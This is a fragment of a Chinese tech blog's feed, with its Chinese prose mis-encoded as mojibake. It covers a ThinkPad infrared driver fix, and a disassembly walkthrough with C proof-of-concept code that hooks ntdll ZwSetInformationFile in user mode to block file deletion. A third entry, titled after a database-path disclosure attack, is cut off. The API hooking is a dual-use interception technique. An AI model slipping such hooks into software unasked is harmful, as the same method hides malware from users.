  </entry>
  
  
  
  <entry>
    <title>è”æƒ³ IBM THINKPAD T60è£…windows 2003/2008çº¢å¤–çº¿è®¾å¤‡é©±åŠ¨è§£å†³</title>
    <link href="/cn/T60_device/"/>
    <url>/cn/T60_device/</url>
    
    <content type="html"><![CDATA[<p>Intel(R) 82801GBM (ICH7-M) LPC Interface Controller - 27B9ï¼ˆACPI\IBM0071\4&amp;61F3B4B&amp;0ï¼‰æ˜¯Intelçš„çº¢å¤–çº¿è®¾å¤‡è¿æ¥ã€‚</p><p>win2003&#x2F;2008ç­‰æœåŠ¡å™¨ç‰ˆæœ¬æ²¡æœ‰è‡ªå¸¦è¿™ä¸ªé©±åŠ¨ã€‚IBM T60ç­‰æœºå™¨å¯ä»¥åœ¨ä¸»æ¿é‡Œè®¾ç½®å…³é—­INTERFACEï¼Œæˆ–è€…ä¸‹è½½XPçš„çº¢å¤–çº¿è¡¥ä¸ï¼ˆIBM Thinkpad Fast Infrared Portï¼‰å°±å¯ä»¥è§£å†³</p><p>ç›¸å…³é“¾æ¥ï¼š<br><a href="http://www-307.ibm.com/pc/support/site.wss/document.do?sitestyle=lenovo&lndocid=MIGR-4KUR6S">http://www-307.ibm.com/pc/support/site.wss/document.do?sitestyle=lenovo&amp;lndocid=MIGR-4KUR6S</a><br><a href="http://www.versiontracker.com/dyn/moreinfo/win/36353">http://www.versiontracker.com/dyn/moreinfo/win/36353</a><br><a href="http://www.soft32.com/download_181790.html">http://www.soft32.com/download_181790.html</a><br><a href="http://forum.thinkpads.com/viewtopic.php?t=22787&sid=3a24f025ddb4d19d3e2d00e122c84957">http://forum.thinkpads.com/viewtopic.php?t=22787&amp;sid=3a24f025ddb4d19d3e2d00e122c84957</a></p><p>å…·ä½“è§£å†³åŠæ³•ï¼š</p><p>ç¬¬ä¸€æ–¹æ³•ï¼šBIOSè®¾ç½®ï¼š</p><p>Config(è®¾ç½®)é€‰é¡¹â€”Infrared(çº¢å¤–çº¿æ¥å£)é€‰é¡¹,è®¾ä¸ºç¦ç”¨(Disable)<br>Config(è®¾ç½®)é€‰é¡¹â€”Infrared Device(çº¢å¤–çº¿è®¾å¤‡)é€‰é¡¹,è®¾ä¸ºç¦ç”¨(Hidden)</p><p>ç¬¬äºŒæ–¹æ³•ï¼šä¸‹è½½çº¢å¤–è¡¥ä¸åæŒ‰ä¸‹åˆ—æ–¹æ³•å®‰è£…ï¼š<br>1ã€è§£å‹å‹ç¼©åŒ…ï¼Œå¹¶æ‰§è¡Œinstirda.batï¼Œç„¶åé‡æ–°å¯åŠ¨è®¡ç®—æœºï¼›<br>2ã€æ’å…¥USBçº¢å¤–çº¿è®¾å¤‡ï¼ˆç¬”è®°æœ¬è‡ªå¸¦çº¢å¤–çš„çœ‹ç¬¬3æ­¥ï¼‰ï¼›<br>3ã€å¯Ÿçœ‹è®¾å¤‡ç®¡ç†å™¨ï¼Œä¼šå‘ç°ç½‘ç»œé€‚é…å™¨å¤„å¤šå‡ºä¸€é¡¹å¸¦å¹å·çš„USB Deviceçš„é¡¹ç›®ï¼›<br>4ã€é€‰æ‹©æ­¤é¡¹ç›®ï¼Œæ›´æ–°é©±åŠ¨ï¼ˆå¯ç”¨WinXPä¸‹çš„é©±åŠ¨ç¨‹åºï¼‰ï¼›<br>5ã€è¿è¡Œreg\Infraredï¼Œå¯¼å…¥æ³¨å†Œè¡¨ï¼›<br>6ã€è®¾å¤‡ç®¡ç†å™¨ä¸­æ‰¾åˆ°é‚£ä¸ªè®¾å¤‡ï¼Œæ›´æ–°é©±åŠ¨â€”â€”ä¸è¦æœç´¢ï¼Œæˆ‘è¦è‡ªå·±é€‰æ‹©å®‰è£…çš„é©±åŠ¨â€”â€”IBM thinkpad fast infrared portï¼Œç„¶åä¸‹ä¸€æ­¥ï¼›<br>7ã€æç¤ºæ‰€éœ€æ–‡ä»¶â€”â€”æ‰¾åˆ°sysé‡Œé¢çš„nscirdaï¼›<br>8ã€æˆåŠŸã€‚</p><p>å·²çŸ¥é—®é¢˜ï¼š<br>1ã€å®‰è£…è¿‡ç¨‹ä¸­å¯èƒ½ï¼Œç³»ç»Ÿæç¤ºä¸ªåˆ«æ–‡ä»¶æ— æ³•æ‰¾åˆ°ï¼Œè¯·æ‰‹åŠ¨å®šä½åˆ°å‰é¢å·²è§£å‹çš„SYSæ–‡ä»¶å¤¹å¤„ï¼Œç¡®è®¤ç»§ç»­ã€‚<br>2ã€ä½¿ç”¨çº¢å¤–è®¾å¤‡åï¼Œæç¤ºç¼ºæ–‡ä»¶ä¹Ÿæ˜¯è¦å®šä½åˆ°SYSæ–‡ä»¶å¤¹è¿›è¡Œå®‰è£…ã€‚<br>3ã€è¦æ˜¯æç¤ºä¸èƒ½è¯†åˆ«ï¼Œå¯ä»¥é‡æ–°æ›´æ–°é©±åŠ¨</p><p>Windows server 2003ï¼ˆä¼ä¸šç‰ˆï¼‰çº¢å¤–é€šè®¯æ”¯æŒç¨‹åºï¼ˆFro 2003 çº¢å¤–é©±åŠ¨ï¼‰ ä¸‹è½½åœ°å€ï¼š</p><p><a href="http://www.irxon.com/download/ir2003.zip">http://www.irxon.com/download/ir2003.zip</a><br><a href="http://www.divshare.com/download/4167497-cb3">http://www.divshare.com/download/4167497-cb3</a></p><p>è¯´æ˜ï¼šWindows server 2003 ï¼ˆä¼ä¸šç‰ˆï¼‰æ˜¯ä¸€æ¬¾é¢å‘ä¼ä¸šç”¨æˆ·çš„é«˜ç«¯æœåŠ¡å™¨æ“ä½œç³»ç»Ÿï¼Œä¸ºäº†å®‰å…¨èµ·è§ï¼Œå®ƒæ²¡æœ‰é›†æˆæ”¯æŒIrDAçº¢å¤–é€šè®¯çš„åè®®è½¯ä»¶ï¼Œæ‰€ä»¥ç›®å‰æ‰€æœ‰çš„IrDAçº¢å¤–è®¾å¤‡éƒ½ä¸èƒ½åœ¨è¿™ä¸ªæ“ä½œç³»ç»Ÿé‡Œä½¿ç”¨ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨XPç³»ç»Ÿé‡Œçš„IrDAçº¢å¤–é€šè®¯åè®®è½¯ä»¶æ¥è§£å†³è¿™ä¸ªé—®é¢˜,å®‰è£…æ—¶ä½¿ç”¨çº¢å¤–é€‚é…å™¨åœ¨XPç³»ç»Ÿé‡Œçš„é©±åŠ¨ç¨‹åºï¼Œç¼ºåè®®è½¯ä»¶å°±åˆ°è¿™ä¸ªè½¯ä»¶åŒ…é‡Œå»æ‰¾ï¼Œå®‰è£…å®Œæˆåçº¢å¤–é€‚é…å™¨å°±å¯ä»¥åœ¨Windows2003é‡Œæ­£å¸¸å·¥ä½œäº†ã€‚</p><p>PS: T60 è£…äº†2003 åä¸€ä¸ªé©±åŠ¨è€æ˜¯æ‰¾ä¸åˆ°ï¼Œæœ€åç»ˆäºæ‰¾åˆ°äº†æ­£ç¡®ç­”æ¡ˆã€‚ã€‚ï¼šï¼‰ share it</p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ring3 ä¸‹æŒ‚é’©Native API ç®€å•å®ç°æ–‡ä»¶é˜²åˆ é™¤</title>
    <link href="/cn/ring3_undelete/"/>
    <url>/cn/ring3_undelete/</url>
    
    <content type="html"><![CDATA[<p>ç®€å•å®ç°æ–‡ä»¶é˜²åˆ é™¤ï¼Œè¯´ç®€å•æ˜¯å› ä¸ºæ²¡æœ‰ç”¨å¾ˆåº•å±‚çš„æŠ€æœ¯ï¼Œä¾‹å¦‚æ–‡ä»¶é©±åŠ¨ä¹‹ç±»ã€‚æˆ‘åªç”¨æœ€ç®€å•çš„æ–¹æ³•å®ç°äº†, ä½¿ç”¨ ring3 çš„API hook æŠ€æœ¯ã€‚éšç€æŠ€æœ¯çš„å‘å±•è¿™ç§æŠ€æœ¯å·²ç»è¿‡ä¸äº†å¾ˆå¤šçš„ä¸»åŠ¨é˜²å¾¡æŠ€æœ¯äº†ã€‚ä¸»è¦æ˜¯æ€è·¯å’Œæ–¹æ³•å’Œåˆ†æè¿‡ç¨‹ã€‚(é«˜æ‰‹é£˜è¿‡)</p><p>ring3 ä¸‹æŒ‚é’© API åŸºæœ¬ä¸Šä¹Ÿå°±æ˜¯ä¿®æ”¹å¯¼å…¥è¡¨ï¼Œå’ŒInline hook ä¿®æ”¹å‰5ä¸ªå­—èŠ‚è¿™å‡ ç§æ–¹æ³•ã€‚æŒ‚é’©Native API æ²¡æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œä¹Ÿå°±æ˜¯å¤šå£°æ˜å‡ ä¸ªç»“æ„å’Œå˜é‡ç±»å‹ã€‚</p><p>å…³äºæŒ‚é’©API è¯·å‚è§ï¼š<a href="http://www.xfocus.net/articles/200403/681.html">www.xfocus.net/articles/200403/681.html</a></p><p>æ–‡ä»¶åˆ é™¤çš„ring3 API æ˜¯DeleteFile, æ­¤API å­˜åœ¨äºkernel32.dll ä¸­ï¼Œç”¨ODåˆ†æä¸€ä¸‹ã€‚(å“ªä¸ªéƒ½å¯ä»¥ï¼ŒIDAæ›´ä¸ç”¨è¯´)</p><p>DeleteFileA çš„åæ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asm">7C80D2FB &gt;/$ 8BFF mov edi, edi<br>7C80D2FD |. 55 push ebp<br>7C80D2FE |. 8BEC mov ebp, esp<br>7C80D300 |. FF75 08 push dword ptr [ebp+8]<br>7C80D303 |. E8 17790100 call 7C824C1F<br>7C80D308 |. 85C0 test eax, eax<br>7C80D30A |. 74 08 je short 7C80D314<br>7C80D30C |. FF70 04 push dword ptr [eax+4] ; /FileName<br>7C80D30F |. E8 3D170000 call DeleteFileW ; \DeleteFileW<br>7C80D314 |&gt; 5D pop ebp<br>7C80D315 \. C2 0400 retn 4<br></code></pre></td></tr></table></figure><p>å¯ä»¥å¾—åˆ°ä¸€ä¸ªæµç¨‹ DeleteFileA â€“&gt; DeleteFileW</p><p>DeleteFileW çš„åæ±‡ç¼–ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs asm">7C80EA51 &gt; $ 8BFF mov edi, edi<br>7C80EA53 . 55 push ebp<br>7C80EA54 . 8BEC mov ebp, esp<br>7C80EA56 . 83EC 50 sub esp, 50<br>7C80EA59 . 56 push esi<br>7C80EA5A . 8D45 C8 lea eax, dword ptr [ebp-38]<br>7C80EA5D . 50 push eax<br>7C80EA5E . 33F6 xor esi, esi<br>7C80EA60 . 56 push esi<br>7C80EA61 . 8D45 E0 lea eax, dword ptr [ebp-20]<br>7C80EA64 . 50 push eax<br>7C80EA65 . FF75 08 push dword ptr [ebp+8]<br>7C80EA68 . C645 FF 00 mov byte ptr [ebp-1], 0<br>7C80EA6C . FF15 5411807C call dword ptr [&lt;&amp;ntdll.RtlDosPathNam&gt;; ntdll.RtlDosPathNameToRelativeNtPathName_U<br>7C80EA72 . 84C0 test al, al<br>7C80EA74 . 0F84 FBCC0200 je 7C83B775<br>7C80EA7A . 8B45 E4 mov eax, dword ptr [ebp-1C]<br>7C80EA7D . 8945 F4 mov dword ptr [ebp-C], eax<br>7C80EA80 . 8B45 C8 mov eax, dword ptr [ebp-38]<br>7C80EA83 . 66:3BC6 cmp ax, si<br>7C80EA86 . 0F85 E9660200 jnz 7C835175<br>7C80EA8C . 8975 D0 mov dword ptr [ebp-30], esi<br>7C80EA8F &gt; 8B45 D0 mov eax, dword ptr [ebp-30]<br>7C80EA92 . 53 push ebx<br>7C80EA93 . 57 push edi<br>7C80EA94 . 8945 B4 mov dword ptr [ebp-4C], eax<br>7C80EA97 . 8D45 E0 lea eax, dword ptr [ebp-20]<br>7C80EA9A . 8945 B8 mov dword ptr [ebp-48], eax<br>7C80EA9D . BF 40402000 mov edi, 204040<br>7C80EAA2 . 57 push edi<br>7C80EAA3 . 6A 07 push 7<br>7C80EAA5 . 8D45 E8 lea eax, dword ptr [ebp-18]<br>7C80EAA8 . 50 push eax<br>7C80EAA9 . 8D45 B0 lea eax, dword ptr [ebp-50]<br>7C80EAAC . 50 push eax<br>7C80EAAD . 68 80000100 push 10080 ; UNICODE &quot;ocuments and<br>7C80EAB2 . 8D45 F8 lea eax, dword ptr [ebp-8]<br>7C80EAB5 . 8975 C0 mov dword ptr [ebp-40], esi<br>7C80EAB8 . 8975 C4 mov dword ptr [ebp-3C], esi<br>7C80EABB . 8B35 1410807C mov esi, dword ptr [&lt;&amp;ntdll.NtOpenFi&gt;; ntdll.ZwOpenFile<br>7C80EAC1 . 50 push eax<br>7C80EAC2 . C745 B0 18000&gt;mov dword ptr [ebp-50], 18<br>7C80EAC9 . C745 BC 40000&gt;mov dword ptr [ebp-44], 40<br>7C80EAD0 . FFD6 call esi ; &lt;&amp;ntdll.NtOpenFile&gt;<br>7C80EAD2 . 8BD8 mov ebx, eax<br>7C80EAD4 . 85DB test ebx, ebx<br>7C80EAD6 .^ 0F8C F5F4FFFF jl 7C80DFD1<br>7C80EADC . 6A 23 push 23 ; /InfoClass = FileAttributeTagInformation<br>7C80EADE . 6A 08 push 8 ; |Bufsize = 8<br>7C80EAE0 . 8D45 D8 lea eax, dword ptr [ebp-28] ; |<br>7C80EAE3 . 50 push eax ; |Buffer<br>7C80EAE4 . 8D45 E8 lea eax, dword ptr [ebp-18] ; |<br>7C80EAE7 . 50 push eax ; |pStatusBlock<br>7C80EAE8 . FF75 F8 push dword ptr [ebp-8] ; |hFile<br>7C80EAEB . FF15 1810807C call dword ptr [&lt;&amp;ntdll.NtQueryInform&gt;; \ZwQueryInformationFile<br>7C80EAF1 . 8BD8 mov ebx, eax<br>7C80EAF3 . 85DB test ebx, ebx<br>7C80EAF5 . 0F8C D5CC0200 jl 7C83B7D0<br>7C80EAFB . 8B45 D8 mov eax, dword ptr [ebp-28]<br>7C80EAFE . 25 00040000 and eax, 400<br>7C80EB03 . 0F85 0ECD0200 jnz 7C83B817<br>7C80EB09 &gt; 85C0 test eax, eax<br>7C80EB0B . 0F85 1CCD0200 jnz 7C83B82D<br>7C80EB11 &gt; 8D45 C8 lea eax, dword ptr [ebp-38]<br>7C80EB14 . 50 push eax<br>7C80EB15 . FF15 5011807C call dword ptr [&lt;&amp;ntdll.RtlReleaseRel&gt;; ntdll.RtlReleaseRelativeName<br>7C80EB1B . FF75 F4 push dword ptr [ebp-C]<br>7C80EB1E . 64:A1 1800000&gt;mov eax, dword ptr fs:[18]<br>7C80EB24 . 8B40 30 mov eax, dword ptr [eax+30]<br>7C80EB27 . 6A 00 push 0<br>7C80EB29 . FF70 18 push dword ptr [eax+18]<br>7C80EB2C . FF15 1010807C call dword ptr [&lt;&amp;ntdll.RtlFreeHeap&gt;] ; ntdll.RtlFreeHeap<br>7C80EB32 . 6A 0D push 0D ; /InfoClass = FileDispositionInformation<br>7C80EB34 . 6A 01 push 1 ; |Bufsize = 1<br>7C80EB36 . 8D45 0B lea eax, dword ptr [ebp+B] ; |<br>7C80EB39 . 50 push eax ; |Buffer<br>7C80EB3A . 8D45 E8 lea eax, dword ptr [ebp-18] ; |<br>7C80EB3D . 50 push eax ; |pStatusBlock<br>7C80EB3E . FF75 F8 push dword ptr [ebp-8] ; |hFile<br>7C80EB41 . C645 0B 01 mov byte ptr [ebp+B], 1 ; |<br>7C80EB45 . FF15 3010807C call dword ptr [&lt;&amp;ntdll.NtSetInformat&gt;; \ntdll.ZwSetInformationFile<br>7C80EB4B . FF75 F8 push dword ptr [ebp-8] ; /Handle<br>7C80EB4E . 8BF0 mov esi, eax ; |<br>7C80EB50 . FF15 3810807C call dword ptr [&lt;&amp;ntdll.NtClose&gt;] ; \ZwClose<br>7C80EB56 . 85F6 test esi, esi<br>7C80EB58 .^ 0F8C 1F91FFFF jl 7C807C7D<br>7C80EB5E . 33C0 xor eax, eax<br>7C80EB60 . 40 inc eax<br>7C80EB61 &gt; 5F pop edi<br>7C80EB62 . 5B pop ebx<br>7C80EB63 &gt; 5E pop esi<br>7C80EB64 . C9 leave<br>7C80EB65 . C2 0400 retn 4<br></code></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸ªæµç¨‹ DeleteFileA â€“&gt; DeleteFileW â€“&gt; ntdll.ZwSetInformationFileï¼Œå› æ­¤æˆ‘ä»¬åªè¦æŒ‚é’©äº†ZwSetInformationFile å°±å¯ä»¥ç®€å•å®ç°ç›®æ ‡äº†ã€‚è¿™é‡Œå†™å‡ºäº†æ–°çš„ ZwSetInformationFile å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> LONG NTSTATUS;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_SUCCESS ((NTSTATUS)0x00000000L)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_STATUS_BLOCK</span> &#123;</span><br>DWORD Status;<br>ULONG Information;<br>&#125; IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> _<span class="hljs-title">FILE_INFORMATION_CLASS</span> &#123;</span><br><span class="hljs-comment">// end_wdm</span><br>FileDirectoryInformation = <span class="hljs-number">1</span>,<br>FileFullDirectoryInformation, <span class="hljs-comment">// 2</span><br>FileBothDirectoryInformation, <span class="hljs-comment">// 3</span><br>FileBasicInformation, <span class="hljs-comment">// 4 wdm</span><br>FileStandardInformation, <span class="hljs-comment">// 5 wdm</span><br>FileInternalInformation, <span class="hljs-comment">// 6</span><br>FileEaInformation, <span class="hljs-comment">// 7</span><br>FileAccessInformation, <span class="hljs-comment">// 8</span><br>FileNameInformation, <span class="hljs-comment">// 9</span><br>FileRenameInformation, <span class="hljs-comment">// 10</span><br>FileLinkInformation, <span class="hljs-comment">// 11</span><br>FileNamesInformation, <span class="hljs-comment">// 12</span><br>FileDispositionInformation, <span class="hljs-comment">// 13</span><br>FilePositionInformation, <span class="hljs-comment">// 14 wdm</span><br>FileFullEaInformation, <span class="hljs-comment">// 15</span><br>FileModeInformation, <span class="hljs-comment">// 16</span><br>FileAlignmentInformation, <span class="hljs-comment">// 17</span><br>FileAllInformation, <span class="hljs-comment">// 18</span><br>FileAllocationInformation, <span class="hljs-comment">// 19</span><br>FileEndOfFileInformation, <span class="hljs-comment">// 20 wdm</span><br>FileAlternateNameInformation, <span class="hljs-comment">// 21</span><br>FileStreamInformation, <span class="hljs-comment">// 22</span><br>FilePipeInformation, <span class="hljs-comment">// 23</span><br>FilePipeLocalInformation, <span class="hljs-comment">// 24</span><br>FilePipeRemoteInformation, <span class="hljs-comment">// 25</span><br>FileMailslotQueryInformation, <span class="hljs-comment">// 26</span><br>FileMailslotSetInformation, <span class="hljs-comment">// 27</span><br>FileCompressionInformation, <span class="hljs-comment">// 28</span><br>FileObjectIdInformation, <span class="hljs-comment">// 29</span><br>FileCompletionInformation, <span class="hljs-comment">// 30</span><br>FileMoveClusterInformation, <span class="hljs-comment">// 31</span><br>FileQuotaInformation, <span class="hljs-comment">// 32</span><br>FileReparsePointInformation, <span class="hljs-comment">// 33</span><br>FileNetworkOpenInformation, <span class="hljs-comment">// 34</span><br>FileAttributeTagInformation, <span class="hljs-comment">// 35</span><br>FileTrackingInformation, <span class="hljs-comment">// 36</span><br>FileMaximumInformation<br><span class="hljs-comment">// begin_wdm</span><br>&#125; FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">FILE_NAME_INFORMATION</span> &#123;</span><br>ULONG FileNameLength;<br>WCHAR FileName[<span class="hljs-number">1</span>];<br>&#125; FILE_NAME_INFORMATION, *PFILE_NAME_INFORMATION;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">NTSTATUS</span> <span class="hljs-params">(__stdcall *ZWQUERYINFORMATIONFILE)</span><span class="hljs-params">(</span><br><span class="hljs-params">IN HANDLE FileHandle,</span><br><span class="hljs-params">OUT PIO_STATUS_BLOCK IoStatusBlock,</span><br><span class="hljs-params">OUT PVOID FileInformation,</span><br><span class="hljs-params">IN ULONG FileInformationLength,</span><br><span class="hljs-params">IN FILE_INFORMATION_CLASS FileInformationClass</span><br><span class="hljs-params">)</span>;<br><br>ZWQUERYINFORMATIONFILE ZwQueryInformationFile;<br><br>NTSTATUS __stdcall <span class="hljs-title function_">Hook_ZwSetInformationFile</span><span class="hljs-params">(IN HANDLE FileHandle,</span><br><span class="hljs-params">OUT PIO_STATUS_BLOCK IoStatusBlock,</span><br><span class="hljs-params">IN PVOID FileInformation,</span><br><span class="hljs-params">IN ULONG FileInformationLength,</span><br><span class="hljs-params">IN FILE_INFORMATION_CLASS FileInformationClass)</span><br>&#123;<br>NTSTATUS ntstatus = STATUS_ACCESS_DENIED;<br><br>HMODULE hNtdll = GetModuleHandle(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>ZwQueryInformationFile = (ZWQUERYINFORMATIONFILE)GetProcAddress(hNtdll, <span class="hljs-string">&quot;ZwQueryInformationFile&quot;</span>);<br><br>IO_STATUS_BLOCK ioStatus;<br>FILE_NAME_INFORMATION * psi = &#123;<span class="hljs-number">0</span>&#125;;<br><br>psi = (FILE_NAME_INFORMATION*)new WCHAR[<span class="hljs-keyword">sizeof</span>(FILE_NAME_INFORMATION) + <span class="hljs-number">1024</span>];<br><span class="hljs-built_in">memset</span>(psi, <span class="hljs-number">0</span>, (<span class="hljs-keyword">sizeof</span>(FILE_NAME_INFORMATION) + <span class="hljs-number">1024</span>)*<span class="hljs-number">2</span>);<br>psi-&gt;FileNameLength = <span class="hljs-number">1024</span>;<br><br>ntstatus = ZwQueryInformationFile(FileHandle, &amp;ioStatus, psi, <span class="hljs-keyword">sizeof</span>(FILE_NAME_INFORMATION) + <span class="hljs-number">1024</span> * <span class="hljs-keyword">sizeof</span>(WCHAR),<br><br>FileNameInformation);<br><br><span class="hljs-keyword">if</span> (ntstatus != STATUS_SUCCESS)<br>PrintZwError(<span class="hljs-string">&quot;ZwQueryInformationFile&quot;</span>, ntstatus);<br><br>ntstatus = STATUS_ACCESS_DENIED;<br><br><span class="hljs-keyword">if</span>( wcsstr(psi-&gt;FileName, <span class="hljs-string">L&quot;b.txt&quot;</span>) == <span class="hljs-literal">NULL</span>)<br>ntstatus = ((PFZWSETINFORMATIONFILE)(PROC)g_ZwSetInformationFile)<br><br>(FileHandle,IoStatusBlock,FileInformation,FileInformationLength,FileInformationClass);<br><br>delete psi;<br><span class="hljs-keyword">return</span> ntstatus;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™åªæ˜¯ä¸€ä¸ªè¯æ˜æ€§ä»£ç ï¼Œè¦å®æˆ˜çš„å…„å¼Ÿè‡ªå·±åŠ¨ç‚¹æ‰‹å§ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>N è°ˆ %5C æš´åº“</title>
    <link href="/cn/5cAcessPath/"/>
    <url>/cn/5cAcessPath/</url>
    
